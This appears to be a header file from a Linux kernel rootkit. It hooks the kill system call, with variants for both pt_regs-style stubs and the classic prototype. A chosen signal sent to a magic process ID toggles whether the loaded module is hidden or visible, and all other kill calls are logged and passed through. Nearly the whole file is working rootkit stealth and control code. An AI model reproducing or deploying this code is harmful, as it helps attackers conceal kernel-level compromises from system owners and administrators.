#ifndef SYS_KILL_H
#define SYS_KILL_H

#include "rootkit.h"

/**
 * Change the visibility of the module if needed
 */
void switch_my_visibility(void)
{
    if (!is_hidden)
        hide_myself();
    else
        show_myself();
}

#if defined(PTREGS_SYSCALL_STUBS)

static asmlinkage long (*orig_kill)(struct pt_regs *regs);

/* ptregs-style syscall stub (x64 >= 4.17) */
static asmlinkage long hook_kill(struct pt_regs *regs)
{
    pid_t pid = (pid_t)regs->di;
    int sig = (int)regs->si;
    long ret;

    if (pid == (pid_t)SHOW_MYSELF && sig == signal)
    {
        info("Special signal %d sent to pid %d\n", signal, SHOW_MYSELF);
        switch_my_visibility();
    }
    else
    {
        info("Kill(pid=%d, sig=%d) intercepted\n", pid, sig);
    }

    if (!orig_kill)
    {
        warn("Original not set\n");
        return -ENOENT;
    }

    /* original takes struct pt_regs* */
    ret = orig_kill(regs);
    return ret;
}

#else

static asmlinkage long (*orig_kill)(pid_t pid, int sig);

/* classic syscall prototype */
static asmlinkage long hook_kill(pid_t pid, int sig)
{
    if (pid == (pid_t)SHOW_MYSELF && sig == signal)
    {
        info("Special signal %d sent to pid %d\n", signal, SHOW_MYSELF);
        switch_my_visibility();
    }
    else
    {
        info("Kill(pid=%d, sig=%d) intercepted\n", pid, sig);
    }

    if (!orig_kill)
    {
        warn("Original not set\n");
        return -ENOENT;
    }

    return ((asmlinkage long (*)(pid_t, int))orig_kill)(pid, sig);
}

#endif

#endif /* SYS_KILL_H */